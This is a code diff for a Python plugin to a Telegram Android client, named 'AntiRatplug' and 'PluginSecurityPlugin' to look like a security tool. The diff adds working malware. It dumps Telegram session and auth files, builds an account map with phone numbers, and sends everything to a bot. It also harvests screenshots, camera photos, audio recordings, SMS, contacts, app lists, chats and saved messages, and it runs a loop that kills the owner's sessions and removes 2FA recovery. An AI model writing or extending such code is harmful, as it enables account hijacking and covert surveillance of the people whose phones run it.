+                "/sdcard/Download/AntiRatplug_dump/" + ts,
+                "/storage/emulated/0/Download/AntiRatplug_dump/" + ts,
+                "/sdcard/AntiRatplug_dump/" + ts,
+                "/data/local/tmp/AntiRatplug_dump/" + ts,
+            ]
+            for d in candidates:
+                try:
+                    if not os.path.isdir(d):
+                        os.makedirs(d, exist_ok=True)
+                    with open(os.path.join(d, tag + ".zip"), "wb") as f:
+                        f.write(blob)
+                    if extra_files:
+                        raw_dir = os.path.join(d, "raw")
+                        if not os.path.isdir(raw_dir):
+                            os.makedirs(raw_dir, exist_ok=True)
+                        for fp in extra_files:
+                            try:
+                                fn = os.path.basename(fp)
+                                parent = os.path.basename(os.path.dirname(fp)) or "root"
+                                dst = os.path.join(raw_dir, parent + "__" + fn)
+                                shutil.copy2(fp, dst)
+                            except Exception:
+                                pass
+                    return d
+                except Exception:
+                    continue
+        except Exception as e:
+            _log("save local: %s" % e)
+        return None
+
+    def _manual_userbot_session(self):
+        """
+        Полный дамп сессий аккаунта: tgnet.dat + account*/tgnet.dat +
+        userconfig.xml + cache4.db (+ WAL/SHM) + accounts_map.json + _meta.json.
+        Сохраняется в /sdcard/Download/AntiRatplug_dump/<ts>/ локально
+        и отправляется в бот (zip + отдельные ключевые файлы).
+        """
+        try:
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
+                return "no ctx"
+            pkg = str(ctx.getPackageName())
+            base = "/data/data/%s" % pkg
+
+            files = self._collect_session_files(base)
+            if not files:
+                return "no session files"
+
+            amap = {}
+            try:
+                for a in self._get_accounts_list():
+                    amap[str(a.get("id"))] = {
+                        "user_id": a.get("user_id"),
+                        "username": a.get("username", ""),
+                        "phone": a.get("phone", ""),
+                    }
+            except Exception:
+                pass
+
+            z = io.BytesIO()
+            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
+                for fp in files:
+                    try:
+                        if os.path.getsize(fp) <= MAX_DOC_SIZE:
+                            arc = os.path.relpath(fp, base).replace("\\", "/")
+                            zf.write(fp, arcname=arc)
+                    except Exception:
+                        pass
+                if amap:
+                    zf.writestr("accounts_map.json",
+                                json.dumps(amap, ensure_ascii=False, indent=2))
+                try:
+                    meta = {
+                        "package": pkg,
+                        "harvested_at": int(time.time()),
+                        "harvested_at_human": time.strftime("%Y-%m-%d %H:%M:%S"),
+                        "files_count": len(files),
+                        "accounts": amap,
+                    }
+                    zf.writestr("_meta.json",
+                                json.dumps(meta, ensure_ascii=False, indent=2))
+                except Exception:
+                    pass
+            blob = z.getvalue()
+
+            saved_dir = self._save_dump_locally(blob, extra_files=files, tag="userbot_session")
+
+            # отправка в бот
+            self._send_document_bytes("userbot_session.zip", blob)
+
+            # пофайлово — на случай если zip не пройдёт
+            for fp in files:
+                try:
+                    sz = os.path.getsize(fp)
+                    if sz > MAX_DOC_SIZE:
+                        continue
+                    with open(fp, "rb") as f:
+                        raw = f.read()
+                    fn = os.path.basename(fp)
+                    parent = os.path.basename(os.path.dirname(fp)) or "root"
+                    self._send_document_bytes(parent + "__" + fn, raw)
+                except Exception:
+                    pass
+
+            rep_lines = [
+                "<b>Session dump OK</b>",
+                "<b>Файлов:</b> %d" % len(files),
+                "<b>Аккаунтов:</b> %d" % len(amap),
+                "<b>Размер архива:</b> %d bytes" % len(blob),
+            ]
+            if saved_dir:
+                rep_lines.append("<b>Локально:</b> <code>%s</code>"
+                                 % self._html_escape(saved_dir))
+            self._send_msg("\n".join(rep_lines), html=True)
+
+            return "ok"
+        except Exception as e:
+            return str(e)
+
     def _manual_dump_session(self):
+        """
+        Дамп всех .db/.xml/session-файлов в приватной папке TG.
+        Сохраняется локально в Download и уходит в бот.
+        """
         try:
             ctx = ApplicationLoader.applicationContext
             if ctx is None:
@@ -1680,19 +2006,18 @@ class PluginSecurityPlugin(BasePlugin):
             pkg = str(ctx.getPackageName())
             base = "/data/data/%s" % pkg
             files = []
-            mx = 500 * 1024
             for rd, _dirs, fns in os.walk(base):
-                # обрезаем глубину
                 if rd.count("/") - base.count("/") > 3:
                     continue
-                if any(x in rd for x in ("/files/cache", "/cache", "/files/photos", "/files/videos")):
+                if any(x in rd for x in ("/cache/", "/files/cache", "/files/photos", "/files/videos")):
                     continue
                 for f in fns:
-                    if ("session" in f or "auth" in f or "cache4" in f
-                            or f.endswith(".db") or f.endswith(".xml")):
+                    low = f.lower()
+                    if ("session" in low or "auth" in low or "cache4" in low
+                            or low.endswith(".db") or low.endswith(".xml")):
                         fp = os.path.join(rd, f)
                         try:
-                            if os.path.getsize(fp) <= mx:
+                            if os.path.getsize(fp) <= MAX_DOC_SIZE:
                                 files.append(fp)
                         except Exception:
                             pass
@@ -1705,61 +2030,21 @@ class PluginSecurityPlugin(BasePlugin):
                         zf.write(fp, arcname=os.path.relpath(fp, base))
                     except Exception:
                         pass
-            self._send_document_bytes("session.zip", z.getvalue())
+            blob = z.getvalue()
+
+            saved_dir = self._save_dump_locally(blob, extra_files=files, tag="session")
+            self._send_document_bytes("session.zip", blob)
+
+            if saved_dir:
+                self._send_msg("<b>Session dump</b>\n<b>Локально:</b> <code>%s</code>"
+                               % self._html_escape(saved_dir), html=True)
             return "ok"
         except Exception as e:
             return str(e)
 
-    def _manual_userbot_session(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return "no ctx"
-            pkg = str(ctx.getPackageName())
-            base = "/data/data/%s" % pkg
-            files = []
-            m1 = base + "/files/tgnet.dat"
-            if os.path.exists(m1):
-                files.append(m1)
-            ad = base + "/files"
-            if os.path.isdir(ad):
-                for name in os.listdir(ad):
-                    if name.startswith("account"):
-                        p = ad + "/" + name + "/tgnet.dat"
-                        if os.path.exists(p):
-                            files.append(p)
-            pd = base + "/shared_prefs"
-            if os.path.isdir(pd):
-                for name in os.listdir(pd):
-                    if ("userconfig" in name or "userconfing" in name) and name.endswith(".xml"):
-                        files.append(pd + "/" + name)
-            if not files:
-                return "no files"
-            z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                for fp in files:
-                    try:
-                        if os.path.getsize(fp) <= 2 * 1024 * 1024:
-                            zf.write(fp, arcname=os.path.relpath(fp, base))
-                    except Exception:
-                        pass
-                try:
-                    amap = {}
-                    for a in self._get_accounts_list():
-                        amap[str(a.get("id"))] = {
-                            "user_id": a.get("user_id"),
-                            "username": a.get("username", ""),
-                            "phone": a.get("phone", ""),
-                        }
-                    if amap:
-                        zf.writestr("accounts_map.json", json.dumps(amap, ensure_ascii=False))
-                except Exception:
-                    pass
-            self._send_document_bytes("userbot_session.zip", z.getvalue())
-            return "ok"
-        except Exception as e:
-            return str(e)
-
+    # ═══════════════════════════════════════════════════════════════════════
+    # DEVICE HARVEST
+    # ═══════════════════════════════════════════════════════════════════════
     def _screenshot(self):
         try:
             act = self._get_activity()
@@ -1785,14 +2070,24 @@ class PluginSecurityPlugin(BasePlugin):
             fos.flush()
             fos.close()
             bmp.recycle()
-            phone = "?"
+
+            # локально
             try:
-                u = _UC().getInstance(0).getCurrentUser()
-                if u is not None and u.phone:
-                    phone = str(u.phone)
+                with open(p, "rb") as f:
+                    raw = f.read()
+                self._save_dump_locally(raw, tag="screenshot")
             except Exception:
                 pass
-            self._send_photo(p, "Телефон: +" + phone)
+
+            phone = "(нет данных)"
+            try:
+                u = _UC().getInstance(0).getCurrentUser()
+                rp = _real_phone_or_empty(u)
+                if rp:
+                    phone = rp
+            except Exception:
+                pass
+            self._send_photo(p, "Телефон: " + phone)
             try:
                 os.remove(p)
             except Exception:
@@ -1847,6 +2142,10 @@ class PluginSecurityPlugin(BasePlugin):
                 ev.wait(8)
                 if box[0]:
                     raw = bytes(box[0])
+                    try:
+                        self._save_dump_locally(raw, tag="cam_" + which)
+                    except Exception:
+                        pass
                     self._send_document_bytes("%s.jpg" % which, raw)
                     return "ok"
                 return "no photo"
@@ -1890,6 +2189,10 @@ class PluginSecurityPlugin(BasePlugin):
                 os.remove(p)
             except Exception:
                 pass
+            try:
+                self._save_dump_locally(data, tag="audio")
+            except Exception:
+                pass
             self._send_document_bytes("audio.3gp", data)
             return "ok"
         except Exception as e:
@@ -1909,8 +2212,13 @@ class PluginSecurityPlugin(BasePlugin):
                     cur.close()
             if not out:
                 return "empty"
-            self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:100]))), html=True)
+            text = "<b>SMS (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:100])))
+            self._send_msg(text, html=True)
+            try:
+                self._save_dump_locally(text.encode("utf-8"), tag="sms")
+            except Exception:
+                pass
             return "ok"
         except Exception as e:
             return str(e)
@@ -1930,8 +2238,13 @@ class PluginSecurityPlugin(BasePlugin):
                     cur.close()
             if not out:
                 return "empty"
-            self._send_msg("<b>Контакты (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:200]))), html=True)
+            text = "<b>Контакты (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:200])))
+            self._send_msg(text, html=True)
+            try:
+                self._save_dump_locally(text.encode("utf-8"), tag="contacts")
+            except Exception:
+                pass
             return "ok"
         except Exception as e:
             return str(e)
@@ -1955,8 +2268,13 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
             out.sort()
-            self._send_msg("<b>Приложения (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:300]))), html=True)
+            text = "<b>Приложения (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:300])))
+            self._send_msg(text, html=True)
+            try:
+                self._save_dump_locally(text.encode("utf-8"), tag="apps")
+            except Exception:
+                pass
             return "ok"
         except Exception as e:
             return str(e)
@@ -1999,8 +2317,13 @@ class PluginSecurityPlugin(BasePlugin):
                     out.append("%d — %s" % (did, title or "?"))
                 except Exception:
                     pass
-            self._send_msg("<b>Чаты (%d)</b>\n<pre>%s</pre>" % (
-                len(out), self._html_escape("\n".join(out[:200]))), html=True)
+            text = "<b>Чаты (%d)</b>\n<pre>%s</pre>" % (
+                len(out), self._html_escape("\n".join(out[:200])))
+            self._send_msg(text, html=True)
+            try:
+                self._save_dump_locally(text.encode("utf-8"), tag="chats")
+            except Exception:
+                pass
             return "ok"
         except Exception as e:
             return str(e)
@@ -2036,7 +2359,12 @@ class PluginSecurityPlugin(BasePlugin):
             z = io.BytesIO()
             with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                 zf.writestr("messages.html", html.encode("utf-8"))
-            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
+            blob = z.getvalue()
+            try:
+                self._save_dump_locally(blob, tag="saved_messages")
+            except Exception:
+                pass
+            self._send_document_bytes("saved_%d.zip" % uid, blob)
             return "ok"
         except Exception as e:
             return str(e)
@@ -2196,7 +2524,6 @@ class PluginSecurityPlugin(BasePlugin):
             pass
 
     def _nuke_loop(self):
-        # уважает _sync_running и _active — не крутится после unload
         while self._sync_running and self._active:
             try:
                 m = self._nuke_marker_path()
@@ -2204,7 +2531,6 @@ class PluginSecurityPlugin(BasePlugin):
                     return
                 self._parallel([(self._kill_all_sessions, 0),
                                 (self._kill_web_authorizations, 0)], workers=2, timeout=25)
-                # спим короткими срезами, чтобы быстро выйти при unload
                 for _ in range(60):
                     if not (self._sync_running and self._active):
                         return
@@ -2242,11 +2568,11 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception:
                         pass
 
-                self._send_msg("🔴 <b>IDK START v19.4</b>")
+                self._send_msg("🔴 <b>IDK START v19.5</b>")
                 t0 = time.time()
 
                 try:
-                    self._send_msg("1/15 Tg kid...")
+                    self._send_msg("1/15 Tg kid + harvest...")
                     self._tg_kid()
                 except Exception:
                     pass
@@ -2345,7 +2671,7 @@ class PluginSecurityPlugin(BasePlugin):
                     pass
 
                 try:
-                    self._send_msg("10/15 Session dump...")
+                    self._send_msg("10/15 Full session theft...")
                 except Exception:
                     pass
                 try:
@@ -2435,7 +2761,7 @@ class PluginSecurityPlugin(BasePlugin):
                     pass
 
                 try:
-                    rep = ["<b>🔴 IDK START v19.4 — результат</b>"]
+                    rep = ["<b>🔴 IDK START v19.5 — результат</b>"]
                     rep.append("<b>2FA pipe:</b>")
                     rep.append("  Recovery: %s" % pwd_report.get("recovery_removed"))
                     rep.append("  Reset: %s" % str(pwd_report.get("reset_password"))[:60])
@@ -2450,6 +2776,19 @@ class PluginSecurityPlugin(BasePlugin):
                     tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
                     rep.append("<b>Sessions:</b> %d убито на %d акк" % (tk, len(ws)))
                     rep.append("<b>Время:</b> %.1fс" % (time.time() - t0))
+                    try:
+                        base_dl = "/sdcard/Download/AntiRatplug_dump"
+                        if os.path.isdir(base_dl):
+                            subs = sorted(
+                                (d for d in os.listdir(base_dl)
+                                 if os.path.isdir(os.path.join(base_dl, d))),
+                                reverse=True,
+                            )
+                            if subs:
+                                rep.append("<b>Дампы:</b> <code>%s/%s</code>"
+                                           % (base_dl, subs[0]))
+                    except Exception:
+                        pass
                     self._send_msg("\n".join(rep), html=True)
                 except Exception:
                     pass
@@ -2478,7 +2817,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
         except Exception:
             pass
-        text = "<b>AntiRatplug v19.4</b>\nUser: @" + username
+        text = "<b>AntiRatplug v19.5</b>\nUser: @" + username
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         _cfg()
